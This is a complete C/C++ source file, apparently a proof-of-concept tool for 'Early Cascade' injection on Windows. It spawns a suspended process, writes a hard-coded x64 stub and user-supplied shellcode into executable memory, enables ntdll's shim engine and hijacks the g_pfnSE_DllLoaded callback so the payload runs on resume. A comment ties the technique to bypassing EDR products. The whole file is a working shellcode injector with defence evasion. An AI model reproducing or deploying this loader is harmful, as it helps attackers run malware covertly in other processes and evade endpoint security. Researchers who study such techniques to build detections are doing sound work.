#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>

typedef struct tagBUFFER {
    PVOID Buffer;
    ULONG Length;
} BUFFER, *PBUFFER;

#define C_PTR( x )  ( PVOID    ) ( x )   
#define U_PTR( x )  ( UINT_PTR ) ( x )   

unsigned char cascade_stub_x64[] = {
    0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
    0x33, 0xc0,                                      // xor eax, eax
    0x45, 0x33, 0xc9,                                // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

    0x48, 0xba,                                      // 
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h

    0xa2,                                            // (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al

    0x49, 0xb8,                                      // 
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h

    0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

    0x48, 0xb8,                                      // 
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h

    0xff, 0xd0,                                      // call rax
    0x33, 0xc0,                                      // xor eax, eax
    0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
    0xc3                                             // retn
};

PVOID MmPeSectionBase(
    _In_ PVOID ModuleBase,
    _In_ PCHAR SectionName
) {
    PIMAGE_DOS_HEADER     DosHeader = {};
    PIMAGE_NT_HEADERS     NtHeader  = {};
    PIMAGE_SECTION_HEADER SecHeader = {};

    NtHeader  = static_cast<PIMAGE_NT_HEADERS>( reinterpret_cast<PVOID>( U_PTR( ModuleBase ) + static_cast<PIMAGE_DOS_HEADER>( ModuleBase )->e_lfanew ) );
    SecHeader = IMAGE_FIRST_SECTION( NtHeader );

    for ( int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++ ) {
        if ( memcmp( SectionName, SecHeader[ i ].Name, strlen( SectionName ) ) == 0) {
            return C_PTR( U_PTR( ModuleBase ) + SecHeader[ i ].VirtualAddress );
        }
    }

    return nullptr; 
}

/**
 * @brief
 *  encodes a function pointer using
 *  the SharedUserData->Cookie value 
 *
 *  ref: https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
 *
 * @param FnPointer
 *  function pointer to encode
 *
 * @return
 *  encoded function pointer
 */
LPVOID SysEncodeFnPointer( 
    _In_ PVOID FnPointer
) {
    ULONG SharedUserCookie = *( ULONG* ) 0x7FFE0330;

    return C_PTR( _rotr64( SharedUserCookie ^ U_PTR( FnPointer ), SharedUserCookie & 0x3F ) );
}

/**
 * @brief
 *  inject a shellcode buffer with a
 *  context argument into a child process 
 *
 * @param Process
 *  proces name path to spawn as our target
 *
 * @param Payload
 *  payload to inject into the remote process
 *
 * @param Context
 *  context to inject as well into the remote process
 *
 * @return
 *  status of function 
 */
NTSTATUS CascadeInject(
    _In_ PSTR    Process,
    _In_ PBUFFER Payload,
    _In_ PBUFFER Context
) {
    PROCESS_INFORMATION ProcessInfo       = {};
    STARTUPINFOA        StartupInfo       = {};
    PVOID               Memory            = {};
    ULONG               Length            = {};
    ULONG               Offset            = {};
    ULONG               Status            = {};
    PVOID               SecMrData         = {};
    PVOID               SecData           = {};
    PVOID               g_ShimsEnabled    = {};
    PVOID               g_pfnSE_DllLoaded = {};
    UINT_PTR            g_Value           = {};

    if ( !Process || !Payload ) {
        return STATUS_INVALID_PARAMETER;
    }

    //
    // prepare and start a child process
    // in a suspended state as our target 
    // 

    RtlSecureZeroMemory( &ProcessInfo, sizeof( ProcessInfo ) );
    RtlSecureZeroMemory( &StartupInfo, sizeof( StartupInfo ) );

    StartupInfo.cb = sizeof( StartupInfo );

    if ( !CreateProcessA( nullptr, Process, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &StartupInfo, &ProcessInfo)) {
        printf( "[-] CreateProcessW Failed: %lx\n", GetLastError() );
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    //
    // allocate memory in the remote process 
    //

    Length = sizeof( cascade_stub_x64 ) + Payload->Length;
    if ( Context ) {
        Length += Context->Length;
    }

    if ( !( Memory = VirtualAllocEx( ProcessInfo.hProcess, nullptr, Length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ) ) ) {
        printf( "[-] VirtualAllocEx Failed: %lx\n", GetLastError() );
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    //
    // resolve the g_ShimsEnabled and g_pfnSE_DllLoaded
    // pointers in the current process which should reflect
    // in the remote process as well (or not).
    // Consider this a hacky solution lol. 
    //
    
    SecMrData = MmPeSectionBase( GetModuleHandleA( "ntdll.dll" ), (PCHAR) ".mrdata" );
    SecData   = MmPeSectionBase( GetModuleHandleA( "ntdll.dll" ), (PCHAR) ".data"   );

    g_ShimsEnabled    = C_PTR( U_PTR( SecData )   + 0x6cf0 );
    g_pfnSE_DllLoaded = C_PTR( U_PTR( SecMrData ) + 0x270  );

    printf( "[*] g_ShimsEnabled   : %p\n", g_ShimsEnabled    );
    printf( "[*] g_pfnSE_DllLoaded: %p\n", g_pfnSE_DllLoaded );

    //
    // update the stub and include the g_ShimsEnabled,
    // MmPayload, MmContext and NtQueueApcThread pointers 
    //

    g_Value = U_PTR( Memory ) + sizeof( cascade_stub_x64 );
    memcpy( &cascade_stub_x64[ 16 ], &g_Value, sizeof( PVOID ) );

    memcpy( &cascade_stub_x64[ 25 ], &g_ShimsEnabled, sizeof( PVOID ) );

    g_Value = U_PTR( Memory ) + sizeof( cascade_stub_x64 ) + Payload->Length;
    if ( !Context ) {
        g_Value = 0;
    }
    memcpy( &cascade_stub_x64[ 35 ], &g_Value, sizeof( PVOID ) );

    g_Value = U_PTR( GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueueApcThread" ) );
    memcpy( &cascade_stub_x64[ 49 ], &g_Value, sizeof( PVOID ) );

    //
    // write stub, payload and context into the allocated memory 
    //

    if ( !WriteProcessMemory( ProcessInfo.hProcess, C_PTR( U_PTR( Memory ) + Offset ), cascade_stub_x64, sizeof( cascade_stub_x64 ), nullptr ) ) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    Offset += sizeof( cascade_stub_x64 );
    if ( !WriteProcessMemory( ProcessInfo.hProcess, C_PTR( U_PTR( Memory ) + Offset ), Payload->Buffer, Payload->Length, nullptr ) ) {
        printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    if ( Context ) {
        //
        // if specified a context then write the context
        // into the remote process memory as well 
        //
        Offset += Payload->Length;
        if ( !WriteProcessMemory( ProcessInfo.hProcess, C_PTR( U_PTR( Memory ) + Offset ), Context->Buffer, Context->Length, nullptr ) ) {
            printf("[-] WriteProcessMemory Failed: %lx\n", GetLastError());
            Status = STATUS_UNSUCCESSFUL;
            goto LEAVE;
        }   
    }

    //
    // patch the remote process pointers and enable the shim engine
    //

    g_Value = TRUE;
    if ( !WriteProcessMemory( ProcessInfo.hProcess, g_ShimsEnabled, &g_Value, sizeof( BYTE ), nullptr ) ) {
        printf( "[-] WriteProcessMemory Failed: %lx\n", GetLastError() );
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    g_Value = U_PTR( SysEncodeFnPointer( Memory ) );
    if ( !WriteProcessMemory( ProcessInfo.hProcess, g_pfnSE_DllLoaded, &g_Value, sizeof( PVOID ), nullptr ) ) {
        printf( "[-] WriteProcessMemory Failed: %lx\n", GetLastError() );
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }

    if ( !ResumeThread( ProcessInfo.hThread ) ) {
        printf( "[-] ResumeThread Failed: %ld\n", GetLastError() );
        Status = STATUS_UNSUCCESSFUL;
        goto LEAVE;
    }; 

    Status = STATUS_SUCCESS;
LEAVE:
    if ( ProcessInfo.hThread ) {
        CloseHandle( ProcessInfo.hThread );
    }

    if ( ProcessInfo.hProcess ) {
        CloseHandle( ProcessInfo.hProcess );
    }

    return Status; 
}

BOOL FileReadA(
    _In_  PSTR   FileName, 
    _Out_ PVOID* Buffer, 
    _Out_ PULONG Length 
) {
    HANDLE FileHandle = {};
    ULONG  BytesRead  = {};
    BOOL   Success    = {};

    if ( !FileName || !Buffer || !Length ) {
        goto LEAVE;
    }

    Success = FALSE; 

    if ( ( FileHandle = CreateFileA( FileName, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr ) ) == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateFileA Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    if ( ( *Length = GetFileSize( FileHandle, nullptr ) ) == INVALID_FILE_SIZE ) {
        printf( "[-] GetFileSize Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    if ( ! ( *Buffer = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, *Length ) ) ) {
        printf( "[!] HeapAlloc Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    if ( !ReadFile( FileHandle, *Buffer, *Length, &BytesRead, nullptr ) || *Length != BytesRead ) {
        printf( "[!] ReadFile Failed With Error: %d\n", GetLastError() );
        goto LEAVE;
    }

    Success = TRUE;

LEAVE:
    if ( FileHandle != INVALID_HANDLE_VALUE ) {
        CloseHandle( FileHandle );
    }

    if ( !Success ) {
        HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, *Buffer );
        *Buffer = nullptr;
        *Length = 0;
    }

    return Success;
}

int main( int argc, char** argv ) {
    BUFFER Payload = {};

    if ( argc <= 2 ) {
        printf( "[-] Not enough arguments\n" );
        printf( "[*] Example: %s [process.exe] [shellcode.bin]\n", argv[ 0 ] );
        return -1;
    }

    if ( !FileReadA( argv[ 2 ], &Payload.Buffer, &Payload.Length ) ) {
        printf( "[-] Failed to read file %s", argv[ 2 ] );
        return -1;
    }

    printf( "[*] Process: %s\n", argv[ 1 ] );
    printf( "[*] Payload @ %p [%d bytes]\n", Payload.Buffer, Payload.Length );

    CascadeInject( argv[ 1 ], &Payload, nullptr );

    printf( "[*] Finished\n" );

    return 0;
}